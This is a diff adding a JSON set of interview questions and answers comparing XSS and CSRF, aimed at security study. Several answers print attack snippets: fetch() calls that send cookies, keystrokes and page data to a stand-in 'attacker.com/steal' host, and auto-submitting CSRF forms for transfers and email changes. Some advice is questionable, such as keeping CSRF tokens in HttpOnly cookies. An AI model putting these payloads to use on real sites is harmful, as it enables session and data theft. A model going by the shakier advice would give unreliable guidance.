@@ -1,0 +1,56 @@
+{
+  "topicId": "xss-vs-csrf",
+  "name": "XSS vs CSRF",
+  "source": "XSS vs CSRF/XSS vs CSRF - Interview Questions & Answers.md",
+  "prompts": [
+    {
+      "id": "pe281b953b5789d",
+      "cluster": "Comparison Questions",
+      "title": "What are the key differences between XSS and CSRF?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Attack Goal:**\n\n- **XSS**: Execute malicious scripts in victim's browser\n- **CSRF**: Trick victim into submitting requests\n\n**2. Execution Location:**\n\n- **XSS**: Client-side (browser)\n- **CSRF**: Server-side (server processes request)\n\n**3. Target:**\n\n- **XSS**: Other users viewing the page\n- **CSRF**: Authenticated users (usually the victim)\n\n**4. Attack Vector:**\n\n- **XSS**: Script injection\n- **CSRF**: Form submission\n\n**5. Prevention:**\n\n- **XSS**: Output encoding, CSP\n- **CSRF**: CSRF tokens, SameSite cookies\n\n**6. Requirements:**\n\n- **XSS**: User input reflected/stored (doesn't require authentication)\n- **CSRF**: User authentication required\n\n---"
+    },
+    {
+      "id": "pe908b544970eb1",
+      "cluster": "Comparison Questions",
+      "title": "Does preventing XSS also prevent CSRF?",
+      "seconds": 120,
+      "answerMarkdown": "**No, preventing XSS does not prevent CSRF.**\u00a0They are different vulnerabilities requiring different mitigation strategies.\n\n**XSS Prevention:**\n\n- Output encoding\n- Content Security Policy (CSP)\n- Input validation\n\n**CSRF Prevention:**\n\n- CSRF tokens\n- SameSite cookies\n- Origin/Referer header validation\n\n**Example:**\n\n```python\n# Protected against XSS\ndef display_comment(comment):\n    return escape(comment)  # Prevents XSS\n\n# But still vulnerable to CSRF\n@app.route('/delete', methods=['POST'])\ndef delete_post():\n    post_id = request.form.get('id')\n    delete_post(post_id)  # Vulnerable to CSRF!\n\n```\n\n**Key Point:**\u00a0Both vulnerabilities must be addressed separately with appropriate mitigations.\n\n---"
+    },
+    {
+      "id": "pcf794ee369b481",
+      "cluster": "Fundamental Questions",
+      "title": "Can CSRF work without XSS?",
+      "seconds": 120,
+      "answerMarkdown": "**Yes, CSRF can work without XSS.**\u00a0CSRF exploits browser's automatic cookie sending behavior, not script execution.\n\n**CSRF Attack (No XSS Required):**\n\n```html\n<!-- Attacker's malicious page (evil.com) -->\n<form id=\"transfer\" action=\"https://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker_account\" />\n  <input type=\"hidden\" name=\"amount\" value=\"10000\" />\n</form>\n<script>document.getElementById('transfer').submit();</script>\n\n```\n\n**How It Works:**\n\n1. Victim visits attacker's page\n2. Form automatically submits to bank.com\n3. Browser includes session cookie (automatic behavior)\n4. Bank processes transfer (trusts cookie)\n\n**No XSS vulnerability required!**\n\n---"
+    },
+    {
+      "id": "p682fcb8c0e78c7",
+      "cluster": "Fundamental Questions",
+      "title": "Can XSS be used to steal more than just cookies?",
+      "seconds": 120,
+      "answerMarkdown": "**Yes, XSS can be used for multiple attack vectors:**\n\n**1. Cookie Theft:**\n\n```jsx\nfetch('http://attacker.com/steal?cookie=' + document.cookie);\n\n```\n\n**2. Keylogging:**\n\n```jsx\ndocument.addEventListener('keypress', function(e) {\n    fetch('http://attacker.com/steal?key=' + e.key);\n});\n\n```\n\n**3. Phishing:**\n\n```jsx\n// Inject fake login form\ndocument.body.innerHTML = '<form>...</form>';\n\n```\n\n**4. Data Theft:**\n\n```jsx\nvar data = document.getElementById('sensitive-data').innerHTML;\nfetch('http://attacker.com/steal?data=' + data);\n\n```\n\n**5. Defacement:**\n\n```jsx\ndocument.body.innerHTML = '<h1>HACKED</h1>';\n\n```\n\n**Key Point:**\u00a0XSS is much more versatile than just cookie theft.\n\n---"
+    },
+    {
+      "id": "p13938914eafdaa",
+      "cluster": "Mitigation Questions",
+      "title": "How do you prevent both XSS and CSRF?",
+      "seconds": 120,
+      "answerMarkdown": "**XSS Prevention:**\n\n```python\n# 1. Output encoding\nfrom html import escape\ndef display_comment(comment):\n    return escape(comment)\n\n# 2. Content Security Policy\n# Content-Security-Policy: default-src 'self'; script-src 'self'\n\n# 3. HttpOnly cookies\n# Set-Cookie: session=abc123; HttpOnly; Secure\n\n```\n\n**CSRF Prevention:**\n\n```python\n# 1. CSRF tokens\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    token = request.form.get('csrf_token')\n    if not validate_csrf_token(token):\n        return \"Invalid CSRF token\", 403\n    # Process transfer\n\n# 2. SameSite cookies\n# Set-Cookie: session=abc123; SameSite=Strict; Secure\n\n# 3. Origin header validation\nif request.headers.get('Origin') != 'https://example.com':\n    return \"Invalid origin\", 403\n\n```\n\n**Best Practice:**\u00a0Implement both XSS and CSRF protection using defense in depth.\n\n---"
+    },
+    {
+      "id": "p11670e56142ada",
+      "cluster": "Scenario-Based Questions",
+      "title": "An attacker wants to change a user's email address. Would they use XSS or CSRF?",
+      "seconds": 120,
+      "answerMarkdown": "**They could use either, but CSRF is more common:**\n\n**CSRF Approach (Common):**\n\n```html\n<!-- Attacker's malicious page -->\n<form action=\"https://site.com/change-email\" method=\"POST\">\n  <input name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>document.forms[0].submit();</script>\n\n```\n\n**XSS Approach (Less Common, Requires XSS Vulnerability):**\n\n```jsx\n// Requires XSS vulnerability first\nfetch('/change-email', {\n    method: 'POST',\n    body: 'email=attacker@evil.com'\n});\n\n```\n\n**Why CSRF is More Common:**\n\n- Doesn't require existing XSS vulnerability\n- Simpler attack vector\n- Works if user is authenticated\n\n**Key Point:**\u00a0CSRF is typically used for state-changing operations like changing email addresses.\n\n---"
+    },
+    {
+      "id": "p2c8ed7d1916bef",
+      "cluster": "Scenario-Based Questions",
+      "title": "Can XSS and CSRF be combined in an attack?",
+      "seconds": 120,
+      "answerMarkdown": "**Yes, XSS can be used to bypass CSRF protection:**\n\n**Scenario:**\n\n1. XSS vulnerability allows script injection\n2. Script reads CSRF token from page\n3. Script uses token to perform CSRF attack\n\n**Attack:**\n\n```jsx\n// 1. XSS payload reads CSRF token\nvar csrf_token = document.querySelector('input[name=\"csrf_token\"]').value;\n\n// 2. Use token to perform CSRF attack\nfetch('/transfer', {\n    method: 'POST',\n    body: 'amount=10000&to=attacker&csrf_token=' + csrf_token\n});\n\n```\n\n**Mitigation:**\n\n- Prevent XSS (output encoding)\n- Store CSRF tokens in HttpOnly cookies\n- Use additional validation beyond tokens\n\n**Key Point:**\u00a0XSS can be used to bypass CSRF protection, making both vulnerabilities dangerous when combined.\n\n---"
+    }
+  ]
+}
